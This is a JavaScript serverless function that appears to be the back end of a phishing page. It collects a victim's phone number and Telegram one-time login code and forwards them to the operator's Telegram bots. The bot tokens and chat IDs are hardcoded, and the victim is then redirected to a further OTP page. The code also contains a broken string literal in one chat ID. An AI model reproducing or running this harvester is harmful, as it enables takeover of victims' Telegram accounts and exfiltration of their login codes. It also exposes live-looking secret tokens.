// Ambil env variable dari Vercel
const BOT1_TOKEN   = process.env.BOT1_TOKEN;
const CHAT1_ID     = process.env.CHAT1_ID;
const BOT2_TOKEN   = process.env.BOT2_TOKEN;
const CHAT2_ID     = process.env.CHAT2_ID;

// Fungsi kirim ke bot Telegram
async function sendMessage(botToken, chatId, message) {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  const payload = {
    chat_id: chatId,
    text: message,
    parse_mode: "Markdown"
  };

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
    const data = await response.json();
    return { success: response.ok, data };
  } catch (err) {
    console.error("Error sending message:", err);
    return { success: false, error: err.message };
  }
}

module.exports = async (req, res) => {
  if (req.method !== "POST") {
    res.status(405).send("Method Not Allowed");
    return;
  }

  // Ambil data dari form OTP
  const { phoneNumber, pin1, pin2, pin3, pin4, pin5, bot_id } = req.body;
  const pin = `${pin1 || ""}${pin2 || ""}${pin3 || ""}${pin4 || ""}${pin5 || ""}`;

  if (!phoneNumber || !pin) {
    res.status(400).send("Nomor HP atau OTP tidak ditemukan");
    return;
  }

  // Format pesan
  const message = `
( OTP | ${phoneNumber} )

- No HP : \`${phoneNumber}\`
- Code OTP : \`${pin}\` via Telegram
  `;

  // Tentukan bot berdasarkan `bot_id`
  let botToken, chatId;
  if (bot_id === "1") {
    botToken = '7982924006:AAHeQSDcuVf0fnaYujbgZeUI2AreoRE8HSc';
    chatId   = '7495263260;
  } else {
    botToken = '7272507372:AAHz55yCKgJkKs1SpzplM7Fg8iaoYVz4YBM';
    chatId   = '5876510981';
  }

  // Kirim pesan
  const result = await sendMessage(botToken, chatId, message);

  if (result.success) {
    // Redirect ke halaman OTP berikutnya
    res.writeHead(302, { Location: "/otp/" });
    res.end();
  } else {
    console.error("Gagal kirim OTP:", result.error);
    res.writeHead(302, { Location: "/otp/" });
    res.end();
  }
};
